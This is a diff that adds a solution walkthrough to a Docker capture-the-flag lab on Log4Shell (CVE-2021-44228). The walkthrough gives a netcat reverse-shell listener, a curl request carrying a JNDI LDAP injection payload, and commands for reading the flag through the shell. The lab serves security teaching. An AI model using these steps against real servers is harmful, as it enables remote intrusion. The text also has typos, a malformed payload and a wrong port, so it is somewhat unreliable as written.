@@ -39,3 +39,21 @@ A local kitten daycare has recently suffered a zero-day exploit resulting in ful
 2.    Click the stop button in 'Containers / Apps' on Docker Desktop
 3.    Run 'docker system prune -a' on the host machine, and press 'y' when prompted
 4.    Delete the cloned Log4j_LAB-Docker repo/folder on your machine
+
+
+**Solution**
+There are several approaches to solving this CTF. Here is one successful approach to our CVE-2021-44228 challenge. 
+
+1.    Open a CLI session on the curl_instance container. Do this through Docker Desktop by selecting the ‘CLI’ button next to the curl_instance container.
+
+2.    Open a CLI session on the c2_instance container.
+
+3.    Run ‘ping -c 1 web_server’ in curl_instance or c2_instance to get the IP address of the vulnerable web server. 
+
+4.    In c2_instance, ru ‘nc -nlvp 9999’. The instructions stated that the compiled java code would want to talk on port 9999. We need to open a listener on that port to receive the java code, which is a reverse shell. 
+
+5.    In curl_instance, we will send the exploit payload. Run ‘curl -A “\{jndi:ldap://ldap_server:1389/Exploit” http://<web_server_IP>:8080’, where <web_server_IP> is the IP address recovered from step 3 above. [1] When this payload is received by web_server, instead of Log4J logging the header it will make a connection to ldap_server on port 8080, asking for the Exploit reference object. [2] ldap_sever then queries the reference object which links out to http_server hosting the java code. [3] The reverse shell is sent to web_server and opened on c2_instance. 
+
+6.    Run ‘find / -name flag.txt’ in c2_instance, which is now a reverse shell executing these commands on web_server. 
+
+7.    Run ‘cat /usr/local/tomcat/flag.txt’ to print the flag. This location will be output from step 6 above. 
